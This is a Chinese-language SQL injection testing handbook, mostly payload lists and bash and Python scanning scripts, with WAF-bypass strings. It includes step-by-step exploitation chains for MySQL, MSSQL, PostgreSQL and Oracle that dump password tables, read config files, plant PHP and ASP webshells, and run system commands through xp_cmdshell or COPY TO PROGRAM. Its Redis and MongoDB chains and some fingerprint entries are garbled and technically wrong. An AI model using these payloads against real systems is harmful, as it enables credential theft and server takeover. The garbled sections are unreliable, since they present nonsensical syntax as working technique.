# SQL 注入测试

## 1. 概述

SQL 注入（SQL Injection）是一种通过将恶意 SQL 代码插入到输入参数中，进而影响后台数据库操作的攻击方式。

**危险等级**: 高

## 2. 测试点识别

### 2.1 常见注入点

| 参数位置 | 示例 | 说明 |
|----------|------|------|
| URL 查询参数 | `/user?id=1` | 路径参数 |
| POST Body | `username=xxx` | 表单参数 |
| HTTP Header | `X-Forwarded-For` | 请求头注入 |
| Cookie | `session_id=xxx` | Cookie 注入 |

### 2.2 危险关键词

```
search, query, id, page, user, name, pass,
keyword, id, item, cat, sort, order, filter
```

## 3. 测试 Payload

### 3.1 注释绕过

```bash
# 单行注释
username=admin'--
username=admin'#
username=admin'/*

# 多行注释
username=admin'/*xxx*/--
```

### 3.2 OR 绕过

```bash
# 万能密码
username=' OR '1'='1
username=admin' OR '1'='1
username=' OR 1=1--

# 利用 AND
username=admin' AND 1=1--
username=admin' AND 1=2--
```

### 3.3 UNION 注入

```bash
# 判断列数
username=admin' ORDER BY 1--
username=admin' ORDER BY 2--
username=admin' ORDER BY 3--  # 报错则列数为2

# 获取数据
username=admin' UNION SELECT null--
username=admin' UNION SELECT null,null--
username=admin' UNION SELECT 1,2,3--
username=admin' UNION SELECT username,password,null FROM users--
```

### 3.4 布尔注入

```bash
# 判断真假
username=admin' AND 1=1--
username=admin' AND 1=2--

# 获取字符
username=admin' AND SUBSTRING((SELECT password),1,1)='a'--
username=admin' AND ASCII(SUBSTRING((SELECT password),1,1))>100--
```

### 3.5 时间盲注

```bash
# MySQL
username=admin' AND SLEEP(3)--
username=admin' AND IF(1=1,SLEEP(3),0)--

# PostgreSQL
username=admin'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--

# SQL Server
username=admin'; IF (1=1) WAITFOR DELAY '00:00:03'--
```

### 3.6 报错注入

```bash
# MySQL
username=admin' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
username=admin' AND UPDATEXML(1,CONCAT(0x7e,user()),1)--

# Oracle
username=admin' AND CTXSYS.DRITHSX.SN(user,(1))>0--
```

## 4. 数据库指纹识别

| 数据库 | 特征 |
|--------|------|
| MySQL | `LEN()`, `SUBSTRING()`, `SLEEP()` |
| PostgreSQL | `pg_sleep()`, `COPY` |
| SQL Server | `WAITFOR`, `CHARINDEX()` |
| Oracle | `CTXSYS.DRITHSX.SN()` |
| SQLite | `LIKE()`, `GLOB()` |

## 5. 判断方法

### 5.1 响应差异

```bash
# 假条件
GET /api/user?id=1 AND 1=2
# 响应：无数据或错误

# 真条件
GET /api/user?id=1 AND 1=1
# 响应：正常数据
```

### 5.2 SQL 错误特征

```json
{"error": "You have an error in your SQL syntax"}
{"error": "mysql_fetch"}
{"error": "ORA-01756"}
{"error": "Microsoft SQL Native Client error"}
```

## 6. 关联漏洞

| 后续漏洞 | 利用路径 |
|----------|----------|
| 认证绕过 | `' OR '1'='1` 绕过登录 |
| 数据泄露 | UNION 查询敏感表 |
| 命令注入 | SELECT INTO OUTFILE 写 Webshell |
| 横向移动 | 获取管理员密码 Hash |

## 7. 测试检查清单

```
□ 识别注入点（参数、Header、Cookie）
□ 测试注释绕过（'--, #, /**/）
□ 测试 OR 绕过（' OR '1'='1）
□ 测试 UNION 注入（判断列数、获取数据）
□ 测试布尔注入（SUBSTRING, ASCII）
□ 测试时间盲注（SLEEP, WAITFOR）
□ 测试报错注入（EXTRACTVALUE, UPDATEXML）
□ 识别数据库类型
□ 判断漏洞存在性
□ 利用漏洞获取数据
```

## 8. SQL注入误报判断标准

### 8.1 核心判断原则

```
【重要】不是所有特殊字符返回500都是SQL注入！

判断逻辑：
1. 先获取正常响应基准
2. 对比注入前后的响应差异
3. 差异必须是"SQL错误"而非"参数格式错误"

【真实SQL注入特征】
- 响应包含SQL错误关键字（syntax, mysql, oracle, sqlite等）
- 响应结构与正常响应不同（字段消失或增加）
- 时间盲注确认延时生效

【误报特征】
- 只是引号/单引号格式问题
- 返回"参数格式错误"而非数据库错误
- 响应与正常完全相同（被过滤或转义）
```

### 8.2 curl + 对比验证流程

```bash
# 1. 获取正常响应基准（必须先执行！）
curl -s "http://api/user?id=1" > sqli_baseline.json

# 2. 测试注入后的响应
curl -s "http://api/user?id=1'" > sqli_test1.json
curl -s 'http://api/user?id=1" OR "1"="1' > sqli_test2.json

# 3. 对比响应差异
diff sqli_baseline.json sqli_test1.json

# 4. SQL错误关键字检测
grep -iE "(mysql|sql|oracle|sqlite|postgresql|sybase|error in your sql|syntax error|warning|fatal)" sqli_test*.json

# 5. 判断标准
# - 正常响应与注入后响应完全相同 → 可能安全（被过滤）
# - 注入后响应包含SQL错误关键字 → 确认SQL注入
# - 注入后响应500但无SQL错误 → 可能是参数校验，非SQL注入
```

### 8.3 详细判断流程

```bash
#!/bin/bash
# SQL注入判断流程

TARGET="http://api/user"
NORMALResp=$(curl -s "${TARGET}?id=1")
NORMAL_LEN=${#NORMALResp}

echo "=== SQL注入误报判断 ==="
echo "正常响应长度: $NORMAL_LEN"
echo "正常响应: $NORMALResp"
echo ""

# 测试各种SQL注入payload
PAYLOADS=(
    "1'"
    "1 OR 1=1"
    "1' OR '1'='1"
    "1'--"
    "1'#"
    "1' ORDER BY 100--"
    "1' AND SLEEP(3)--"
)

for payload in "${PAYLOADS[@]}"; do
    echo "Testing: ${TARGET}?id=${payload}"
    RESP=$(curl -s -w "\nHTTP_CODE:%{http_code}" "${TARGET}?id=${payload}")
    HTTP_CODE=$(echo "$RESP" | grep "HTTP_CODE:" | cut -d: -f2)
    BODY=$(echo "$RESP" | sed '/HTTP_CODE:/d')
    BODY_LEN=${#BODY}
    
    echo "  HTTP状态码: $HTTP_CODE"
    echo "  响应长度: $BODY_LEN"
    
    # 检查SQL错误关键字
    if echo "$BODY" | grep -qiE "(mysql|sql error|oracle|sqlite|postgresql|sybase|error in your sql|syntax error|warning|fatal|exception)"; then
        echo "  [确认SQL注入] 响应包含SQL错误关键字"
        echo "  错误信息: $(echo "$BODY" | grep -iE "(mysql|sql error|oracle|sqlite|postgresql|sybase|error in your sql|syntax error)" | head -1)"
    else
        # 检查响应差异
        if [[ "$BODY_LEN" -eq 0 ]]; then
            echo "  [可能安全] 返回空响应"
        elif [[ "$BODY" == "$NORMALResp" ]]; then
            echo "  [可能安全] 响应与正常相同（可能被过滤）"
        else
            echo "  [需进一步分析] 响应有差异但无SQL错误关键字"
            echo "  响应: ${BODY:0:200}..."
        fi
    fi
    echo ""
done
```

### 8.4 Python脚本（复杂场景）

```python
import requests
import time
import re

class SQLiTester:
    def __init__(self, target):
        self.target = target
        self.baseline = None
        
    def get_baseline(self, param, value):
        """获取正常响应基准"""
        resp = requests.get(f"{self.target}?{param}={value}")
        self.baseline = {
            'status': resp.status_code,
            'body': resp.text,
            'length': len(resp.text),
            'time': 0
        }
        return self.baseline
    
    def check_sqli_error(self, body):
        """
        检测响应中是否包含SQL错误
        
        【判断标准】
        1. 必须包含明确的数据库错误关键字
        2. 错误必须是"SQL相关"而非"参数格式错误"
        """
        sql_errors = [
            'mysql', 'mysqli', 'mariadb',
            'postgresql', 'postgres',
            'oracle', 'oci',
            'sqlite', 'sqlite3',
            'sql server', 'mssql',
            'sybase', 'db2',
            'error in your sql', 'sql syntax',
            'syntax error', 'sql error',
            'warning:', 'fatal:',
            'exception', 'stack trace',
            'oracle error', 'ora-',
            'microsoft sql native client',
            'ctsys.drithssx.sn',  # Oracle报错注入特征
            'extractvalue', 'updatexml',  # MySQL报错注入
        ]
        
        body_lower = body.lower()
        found_errors = []
        
        for error in sql_errors:
            if error.lower() in body_lower:
                found_errors.append(error)
        
        return found_errors
    
    def test_injection(self, param, payload, expected_time=None):
        """
        测试SQL注入
        
        Returns:
            (is_vuln, reason, details)
        """
        start = time.time()
        resp = requests.get(f"{self.target}?{param}={payload}", timeout=30)
        elapsed = time.time() - start
        
        # 1. 状态码检查
        if resp.status_code >= 500:
            # 500可能是注入导致数据库错误
            errors = self.check_sqli_error(resp.text)
            if errors:
                return True, f"SQL注入确认（500错误+SQL关键字: {errors}）", resp.text[:500]
            else:
                return False, "500错误但无SQL关键字，可能是参数校验失败", None
        
        # 2. 响应内容检查
        if self.baseline:
            if resp.text == self.baseline['body']:
                return False, "响应与正常响应完全相同（可能被过滤或转义）", None
            
            # 检查SQL错误
            errors = self.check_sqli_error(resp.text)
            if errors:
                return True, f"SQL注入确认（响应包含SQL错误关键字: {errors}）", resp.text[:500]
        
        # 3. 时间盲注检查
        if expected_time and elapsed >= expected_time:
            return True, f"时间盲注确认（延时{elapsed:.2f}秒）", None
        
        # 4. 响应长度异常检查
        if self.baseline:
            length_diff = abs(len(resp.text) - self.baseline['length'])
            if length_diff > 1000:  # 长度差异超过1000字节
                return True, f"响应长度异常变化（差异{length_diff}字节）", resp.text[:500]
        
        return False, "未发现SQL注入特征", None
    
    def run_tests(self, param, value="1"):
        """执行完整SQL注入测试"""
        print(f"\n=== SQL注入测试: {self.target}?{param}={value} ===\n")
        
        # 获取基准
        self.get_baseline(param, value)
        print(f"基准响应: {self.baseline['body'][:200]}...\n")
        
        # 测试payload
        payloads = [
            ("注释绕过", f"{value}'--"),
            ("OR绕过", f"{value}' OR '1'='1"),
            ("UNION探测", f"{value}' ORDER BY 100--"),
            ("时间盲注", f"{value}' AND SLEEP(3)--"),
            ("报错注入", f"{value}' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"),
        ]
        
        for name, payload in payloads:
            print(f"Testing: {payload}")
            is_vuln, reason, details = self.test_injection(param, payload, expected_time=3 if 'SLEEP' in payload else None)
            
            if is_vuln:
                print(f"  [VULN] {reason}")
                if details:
                    print(f"  响应片段: {details[:200]}")
            else:
                print(f"  [SAFE] {reason}")
            print()

# 使用示例
if __name__ == "__main__":
    tester = SQLiTester("http://api/user")
    tester.run_tests("id", "1")
```

## 9. 实战判断案例

### 案例1：参数格式错误 vs SQL注入

```
【场景】：请求 /api/user?id=1' 返回400

【curl测试】：
curl -s /api/user?id=1' 
# 返回: {"error": "Invalid parameter format"}

【判断】：
- 状态码: 400 (不是500)
- 响应内容: 参数格式错误（不是SQL错误）
- 结论: 【误报】只是参数校验，不是SQL注入

【正确做法】：
curl -s /api/user?id=1
# 返回: {"userId": 1, "name": "admin"}

对比后确认只是参数校验差异，不是SQL注入
```

### 案例2：真实SQL注入

```
【场景】：请求 /api/user?id=1' 返回500

【curl测试】：
curl -s /api/user?id=1'
# 返回: {"error": "You have an error in your SQL syntax; 
#        check the manual that corresponds to your MySQL server version..."}

【判断】：
- 状态码: 500
- 响应包含: "error in your SQL syntax", "MySQL"
- 结论: 【确认SQL注入】
```

### 案例3：被过滤的注入

```
【场景】：请求 /api/user?id=1' OR '1'='1 返回正常数据

【curl测试】：
curl -s /api/user?id=1' OR '1'='1
# 返回: {"userId": 1, "name": "admin"}

curl -s /api/user?id=1
# 返回: {"userId": 1, "name": "admin"}

【判断】：
- 两次响应完全相同
- 结论: 【误报】注入被过滤或转义，未触发漏洞
```

## 10. SQL注入新思路（2026）

> 来源：HackerOne 2026年中国区TOP4实战经验

### 10.1 Header注入（重点！）

**核心思路**：开发常认为IP由系统传入天然安全，直接拼接进SQL做日志、风控、黑白名单查询，极易产生注入。

**重点测试Header**：
- `X-Forwarded-For`
- `X-Real-IP`
- `Client-IP`
- `X-Client-IP`

**测试方法**：

```bash
# 1. 获取正常响应基准
curl -s -H "X-Forwarded-For: 1.1.1.1" "http://api/xxx" > header_baseline.json

# 2. 测试单引号注入
curl -s -H "X-Forwarded-For: 1.1.1.1'" "http://api/xxx" > header_sqli1.json

# 3. 测试双单引号（关键对比）
curl -s -H "X-Forwarded-For: 1.1.1.1''" "http://api/xxx" > header_sqli2.json

# 4. 对比差异
diff header_sqli1.json header_sqli2.json
# 如果A≠B → 可能存在注入
```

**curl验证脚本**：
```bash
#!/bin/bash
# Header注入测试脚本

TARGET="http://api/user"
HEADERS=("X-Forwarded-For" "X-Real-IP" "Client-IP" "X-Client-IP")

echo "=== Header注入测试 ==="

for HEADER in "${HEADERS[@]}"; do
    echo "[测试] $HEADER"
    
    # 正常请求
    RESP_A=$(curl -s -H "$HEADER: 1.1.1.1'" "$TARGET")
    
    # 单引号 vs 双单引号对比
    RESP_B=$(curl -s -H "$HEADER: 1.1.1.1''" "$TARGET")
    
    if [ "$RESP_A" != "$RESP_B" ]; then
        echo "  → [疑似漏洞] A≠B，响应有差异"
        echo "  A: ${RESP_A:0:100}"
        echo "  B: ${RESP_B:0:100}"
        
        # 检查SQL错误
        if echo "$RESP_A $RESP_B" | grep -qiE "(sql|mysql|error|syntax)"; then
            echo "  → [确认] 包含SQL错误关键字"
        fi
    else
        echo "  → [安全] A=B，响应相同"
    fi
    echo ""
done
```

### 10.2 路径注入

**核心思路**：放弃只在URL末尾参数Fuzz，改为在路径中间插入单引号测试。部分中间件会直接提取路径片段拼接SQL。

**测试方法**：

```bash
# 原路径
curl -s "http://api/a/b/c" > path_baseline.json

# 路径中间插入单引号对比
curl -s "http://api/a/b/c'" > path_test1.json
curl -s "http://api/a/b/c''" > path_test2.json

# 判断：A≠B → 可能存在注入
```

**实战Payload示例**：
```http
GET /serv' and (extractvalue(1,concat(0x7e,(select database()),0x7e)))=1 or '1'='1 HTTP/1.1
Host: target.com
```

**curl验证脚本**：
```bash
#!/bin/bash
# 路径注入测试脚本

TARGET="http://api"
PATHS=("/a/b/c" "/user/list" "/admin/config" "/api/internal")

echo "=== 路径注入测试 ==="

for PATH in "${PATHS[@]}"; do
    echo "[测试] $PATH"
    
    # 原始路径
    RESP_ORIG=$(curl -s "${TARGET}${PATH}")
    
    # 路径+单引号
    RESP_TEST1=$(curl -s "${TARGET}${PATH}'")
    
    # 路径+双单引号（关键对比）
    RESP_TEST2=$(curl -s "${TARGET}${PATH}''")
    
    if [ "$RESP_TEST1" != "$RESP_TEST2" ]; then
        echo "  → [疑似漏洞] 路径注入可能"
        echo "  单引号响应: ${RESP_TEST1:0:100}"
        echo "  双引号响应: ${RESP_TEST2:0:100}"
    else
        echo "  → [安全] 响应相同"
    fi
    echo ""
done
```

### 10.3 隐藏参数/跨接口参数复用（核心技巧！）

**核心思路**：把A接口的参数强行拼到B接口测试。后端函数常公用，部分参数前端不传但后端仍接收，因无人调用而未做过滤。

**操作步骤**：
1. 从JS/接口文档提取所有接口
2. 把已知参数串拼到其他接口后
3. 用 `'` vs `''` 对比测试

**测试方法**：

```bash
# 1. 假设从JS中发现接口 /api/user/list 有参数 userId
# 2. 把 userId 参数拼到其他接口测试

# 测试 /api/internal/config 是否接收 userId 参数
curl -s "http://api/internal/config?userId=1'" > hidden_test1.json
curl -s "http://api/internal/config?userId=1''" > hidden_test2.json

# 测试 limit 参数复用
curl -s "http://api/internal/config?limit='&xxxid='" > hidden_test3.json
curl -s "http://api/internal/config?limit=''&xxxid=''" > hidden_test4.json

# 判断：A≠B → 可能存在注入
```

**curl验证脚本**：
```bash
#!/bin/bash
# 跨接口隐藏参数注入测试脚本

TARGET="http://api"

echo "=== 跨接口隐藏参数测试 ==="

# 常用参数（从JS/API文档提取的）
PARAMS=("userId" "id" "limit" "offset" "page" "keyword" "type" "category" "status")

# 目标接口（应重点测试内部/隐藏接口）
ENDPOINTS=("/internal/config" "/admin/system" "/api/common" "/backend/db" "/api/private")

for ENDPOINT in "${ENDPOINTS[@]}"; do
    echo "[测试接口] $ENDPOINT"
    
    for PARAM in "${PARAMS[@]}"; do
        # 参数=单引号 vs 参数=双单引号
        RESP1=$(curl -s "${TARGET}${ENDPOINT}?${PARAM}='")
        RESP2=$(curl -s "${TARGET}${ENDPOINT}?${PARAM}=''")
        
        if [ "$RESP1" != "$RESP2" ]; then
            echo "  → [疑似漏洞] 参数 ${PARAM}"
            echo "    单引号: ${RESP1:0:80}"
            echo "    双引号: ${RESP2:0:80}"
        fi
    done
    echo ""
done
```

### 10.4 新思路对比表

| 测试类型 | 测试表达式 | 差异判断 |
|---------|-----------|----------|
| XFF注入 | 原始请求 vs `X-Forwarded-For: 1.1.1.1'` | A≠B → 可能注入 |
| 路径注入 | `/a/b/c'` vs `/a/b/c''` | A≠B → 可能注入 |
| 隐藏参数 | `limit='` vs `limit=''` | A≠B → 可能注入 |

### 10.5 新思路Python脚本

```python
import requests
import itertools

class NewSQLiTester:
    """
    SQL注入新思路测试器（2026）
    1. Header注入
    2. 路径注入
    3. 隐藏参数/跨接口复用
    """
    
    def __init__(self, target):
        self.target = target
        self.baseline = None
        
    def test_header_injection(self, endpoint, header_name="X-Forwarded-For"):
        """测试Header注入"""
        print(f"\n[Header注入] {header_name}")
        
        # 测试不同payload
        payloads = ["'", "''", "' OR '1'='1", "1' AND SLEEP(3)--"]
        results = []
        
        for payload in payloads:
            headers = {header_name: f"1.1.1.1{payload}"}
            try:
                resp = requests.get(f"{self.target}{endpoint}", headers=headers, timeout=10)
                results.append({
                    'payload': payload,
                    'status': resp.status_code,
                    'length': len(resp.text),
                    'body_preview': resp.text[:100]
                })
            except Exception as e:
                results.append({'payload': payload, 'error': str(e)})
        
        # 判断：payload不同但响应不同 → 疑似注入
        if len(set(r.get('length', 0) for r in results)) > 1:
            return True, "Header注入疑似存在", results
        return False, "未发现异常", results
    
    def test_path_injection(self, path):
        """测试路径注入"""
        print(f"\n[路径注入] {path}")
        
        # 在路径末尾插入单引号测试
        test_paths = [f"{path}'", f"{path}''", f"{path}' OR '1'='1"]
        results = []
        
        for test_path in test_paths:
            try:
                resp = requests.get(f"{self.target}{test_path}", timeout=10)
                results.append({
                    'path': test_path,
                    'status': resp.status_code,
                    'length': len(resp.text),
                    'body_preview': resp.text[:100]
                })
            except Exception as e:
                results.append({'path': test_path, 'error': str(e)})
        
        # 判断：不同路径但响应不同 → 疑似注入
        lengths = [r.get('length', 0) for r in results]
        if len(set(lengths)) > 1:
            return True, "路径注入疑似存在", results
        return False, "未发现异常", results
    
    def test_hidden_params(self, endpoint, known_params):
        """测试隐藏参数注入（跨接口复用）"""
        print(f"\n[隐藏参数] {endpoint}")
        
        results = []
        
        for param in known_params:
            # 单引号 vs 双单引号
            for payload in ["'", "''"]:
                url = f"{self.target}{endpoint}?{param}={payload}"
                try:
                    resp = requests.get(url, timeout=10)
                    results.append({
                        'param': param,
                        'payload': payload,
                        'status': resp.status_code,
                        'length': len(resp.text)
                    })
                except Exception as e:
                    results.append({'param': param, 'payload': payload, 'error': str(e)})
        
        # 判断：同一参数不同payload但响应相同 → 可能安全
        # 判断：同一参数不同payload但响应不同 → 疑似注入
        param_results = {}
        for r in results:
            if 'error' not in r:
                param = r['param']
                if param not in param_results:
                    param_results[param] = []
                param_results[param].append(r['length'])
        
        vulns = []
        for param, lengths in param_results.items():
            if len(set(lengths)) > 1:
                vulns.append(param)
        
        if vulns:
            return True, f"隐藏参数注入疑似存在: {vulns}", results
        return False, "未发现异常", results
    
    def run_all_tests(self):
        """执行完整新思路测试"""
        print("=" * 50)
        print("SQL注入新思路测试（2026）")
        print("=" * 50)
        
        # 1. Header注入测试
        print("\n>>> 1. Header注入测试")
        is_vuln, reason, _ = self.test_header_injection("/user/list")
        print(f"结果: {reason}")
        
        # 2. 路径注入测试
        print("\n>>> 2. 路径注入测试")
        paths = ["/a/b/c", "/user/list", "/admin/config"]
        for path in paths:
            is_vuln, reason, _ = self.test_path_injection(path)
            if is_vuln:
                print(f"  {path}: {reason}")
        
        # 3. 隐藏参数测试
        print("\n>>> 3. 隐藏参数测试")
        params = ["userId", "id", "limit", "page"]
        endpoints = ["/internal/config", "/admin/system", "/api/common"]
        for ep in endpoints:
            is_vuln, reason, _ = self.test_hidden_params(ep, params)
            if is_vuln:
                print(f"  {ep}: {reason}")

# 使用示例
if __name__ == "__main__":
    tester = NewSQLiTester("http://api")
    tester.run_all_tests()
```

### 10.6 实战测试注意事项

```
【重要提醒】

1. Header注入优先级最高
   - 开发常忽略IP字段的过滤
   - 常用于日志、风控、黑白名单查询
   - 实际漏洞率较高

2. 路径注入需重点关注
   - 关注报错信息中的物理路径
   - 国外SRC奖励约200美元

3. 隐藏参数测试技巧
   - 从JS文件提取所有参数名
   - 尝试把参数拼到内部接口
   - 前端不传 ≠ 后端不收
   - 无人测试 ≠ 无漏洞
```

## 11. WAF绕过方法

> 参考：security-testing/payloader WAF bypass techniques

### 11.1 大小写混淆

```bash
# 原型
' UNION SELECT 1,database(),3--

# 绕过：大小写混合
' UnIoN SeLeCt 1,database(),3--
' uNiOn SeLeCt 1,user(),3--
```

### 11.2 内联注释

```bash
# 原型
' UNION SELECT 1,2,3--

# 绕过：使用内联注释
' /*!UNION*/ /*!SELECT*/ 1,2,3--
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
'/*!12345UNION*/(/*!12345SELECT*/1,2,3)--
```

### 11.3 双写绕过

```bash
# 原型
' UNION SELECT 1,2,3--

# 绕过：关键字双写
' UNUNIONION SELSELECTECT 1,2,3--
' UNIunionON SELselectECT 1,2,3--
```

### 11.4 空格替代

```bash
# 原型
' UNION SELECT 1,2,3--

# 绕过：多种空格替代
'/**/UNION/**/SELECT/**/1,2,3--
' %0aUNION%0aSELECT%0a1,2,3--
'%0bUNION%0bSELECT%0b1,2,3--
'%09UNION%09SELECT%091,2,3--
'%a0UNION%a0SELECT%a01,2,3--
'(UNION(SELECT(1),(2),(3)))--
```

### 11.5 编码绕过

```bash
# URL编码
' UNION SELECT 1,2,3-- → %27%20UNION%20SELECT%201,2,3--

# 双重URL编码
' → %2527

# 十六进制编码
' → 0x27
' UNION SELECT → 0x2720554e494f4e2053454c454354

# Unicode编码
' → %u0027
```

### 11.6 特殊字符替代

```bash
# 原型
' OR 1=1--

# 绕过：使用替代字符
' || 1=1--
' | 1=1--
' & 1=1--
' && 1=1--
```

### 11.7 数字替代

```bash
# 使用数学运算
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3e0--
' UNION SELECT 1,0x2,0x3--
```

### 11.8 WAF绕过判断脚本

```bash
#!/bin/bash
# SQL注入WAF绕过测试脚本

TARGET="http://api/user"
PARAM="id"

echo "=== SQL注入WAF绕过测试 ==="

# 定义绕过payload
BYPASS_PAYLOADS=(
    # 大小写混淆
    "${PARAM}=1' UnIoN SeLeCt 1,2,3--"
    "${PARAM}=1' uNiOn SeLeCt user(),2,3--"
    
    # 内联注释
    "${PARAM}=1'/*!UNION*//*!SELECT*/1,2,3--"
    "${PARAM}=1'/*!50000UNION*//*!50000SELECT*/1,2,3--"
    
    # 双写绕过
    "${PARAM}=1' UNUNIONION SELSELECTECT 1,2,3--"
    
    # 空格替代
    "${PARAM}=1'/**/UNION/**/SELECT/**/1,2,3--"
    "${PARAM}=1'%0aUNION%0aSELECT%0a1,2,3--"
    "${PARAM}=1'%0bUNION%0bSELECT%0b1,2,3--"
    
    # 特殊字符
    "${PARAM}=1'||1=1--"
    "${PARAM}=1'&&1=1--"
)

for PAYLOAD in "${BYPASS_PAYLOADS[@]}"; do
    echo "[测试] ${PAYLOAD:0:60}..."
    RESP=$(curl -s "${TARGET}?${PAYLOAD}")
    
    # 检查是否绕过成功
    if echo "$RESP" | grep -qiE "(sql|mysql|error|syntax|database|version)"; then
        echo "  → [绕过成功] 响应包含数据库信息"
        echo "  响应片段: ${RESP:0:100}"
    elif [ ${#RESP} -gt 100 ]; then
        echo "  → [疑似成功] 响应长度异常: ${#RESP}"
    else
        echo "  → [失败] 被拦截或无响应"
    fi
    echo ""
done
```

## 12. SQL注入详细利用链

### 12.1 MySQL完整利用链

```bash
# 阶段1: 探测注入点
' OR '1'='1

# 阶段2: 确定列数
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- (报错则列数为2)

# 阶段3: 确定显示位置
' UNION SELECT 1,2,3--

# 阶段4: 获取数据库信息
' UNION SELECT 1,database(),version()--

# 阶段5: 获取表名
' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--

# 阶段6: 获取列名
' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--

# 阶段7: 获取数据
' UNION SELECT 1,username,password FROM users LIMIT 0,1--

# 阶段8: 获取Shell (DBA权限)
' UNION SELECT 1,2,load_file('/var/www/html/config.php')--  # 读取配置
' UNION SELECT 1,2,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--  # 写入Shell

# 阶段9: 命令执行
http://target/shell.php?cmd=whoami
```

### 12.2 MSSQL完整利用链

```bash
# 阶段1: 探测注入点
' OR 1=1--

# 阶段2: 获取版本信息
' UNION SELECT 1,@@version,3--

# 阶段3: 检查xp_cmdshell状态
'; EXEC master..xp_cmdshell 'whoami'--

# 阶段4: 开启xp_cmdshell
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--

# 阶段5: 命令执行
'; EXEC master..xp_cmdshell 'whoami'--

# 阶段6: 写入Shell
'; EXEC master..xp_cmdshell 'echo ^<%eval(request("cmd"))^> > C:\inetpub\wwwroot\shell.asp'--

# 阶段7: 读取配置文件
' UNION SELECT 1,2,string FROM master..sysdatabases--
```

### 12.3 PostgreSQL完整利用链

```bash
# 阶段1: 探测注入点
' OR 1=1--

# 阶段2: 获取版本
' UNION SELECT 1,version(),3--

# 阶段3: 获取表名
' UNION SELECT 1,table_name,3 FROM information_schema.tables--

# 阶段4: 获取列名
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--

# 阶段5: 获取数据
' UNION SELECT 1,username,password FROM users--

# 阶段6: 写入文件
' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/shell.php'--

# 阶段7: 命令执行 (如果有)
'; COPY (SELECT '') TO PROGRAM 'whoami'--
```

### 12.4 Oracle完整利用链

```bash
# 阶段1: 探测注入点
' OR 1=1--

# 阶段2: 获取版本
' UNION SELECT 1,banner,3 FROM v$version--

# 阶段3: 获取表名
' UNION SELECT 1,table_name,3 FROM user_tables--

# 阶段4: 获取列名
' UNION SELECT 1,column_name,3 FROM user_tab_columns WHERE table_name='USERS'--

# 阶段5: 获取数据
' UNION SELECT 1,username,password FROM users--

# 阶段6: 报错注入获取数据
' AND CTXSYS.DRITHSX.SN(user,(SELECT password FROM users))>0--
```

### 12.5 Redis注入利用链

```bash
# Redis未授权访问 + SQL注入
# 探测: 观察响应是否包含Redis信息

# 读取Redis配置
' UNION SELECT 1,2,config_get(*) FROM redis_instance--

# 写入WebShell
' UNION SELECT 1,2,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

# 如果支持堆叠查询
'; SET @a '<?php system($_GET["cmd"]); ?>'; CONFIG SET dir /var/www/html; CONFIG SET dbfilename shell.php; SAVE--
```

### 12.6 MongoDB注入利用链

```bash
# MongoDB运算符注入
# 探测: {'$ne': 1} 等

# 绕过登录
' OR '1'='1  → {"$or": [{"username": "admin"}, {"username": "{$gt": ""}}]}

# 获取数据
{"$regex": "^admin.*"}
{"$where": "function() { return true; }"}

# 报错注入
' AND 1=1 -- → {"$where": "function() { return sleep(5); }"}
```

### 12.7 利用链速查表

| 阶段 | MySQL | MSSQL | PostgreSQL | Oracle | Redis |
|------|-------|-------|------------|--------|-------|
| 探测 | `' OR '1'='1` | `' OR 1=1--` | `' OR 1=1--` | `' OR 1=1--` | `{"$ne": 1}` |
| 列数 | ORDER BY N | ORDER BY N | ORDER BY N | UNION NULL | - |
| 信息 | database() | @@version | version() | v$version | redis_version() |
| 表名 | information_schema | sysobjects | information_schema | user_tables | CONFIG GET * |
| 写文件 | INTO OUTFILE | xp_cmdshell | COPY TO | UTL_FILE | CONFIG SET |
| 命令 | 需要DBA | xp_cmdshell | COPY TO PROGRAM | 需要DBA | 支持未授权 |

## 13. 各数据库指纹识别

```bash
# MySQL特征
LEN(), SUBSTRING(), SLEEP(), BENCHMARK()
MySQL server version %s

# MSSQL特征
WAITFOR, CHARINDEX(), @@version
SqlServer Native Client

# PostgreSQL特征
pg_sleep(), COPY, pg_catalog
PostgreSQL %s

# Oracle特征
CTXSYS.DRITHSX.SN(), v$version
ORA-01756

# MongoDB特征
$ne, $gt, $regex, $where
NoSQLDB/MongoDB

# Redis特征
CONFIG, SET, GET, SELECT
+OK, -ERR
```
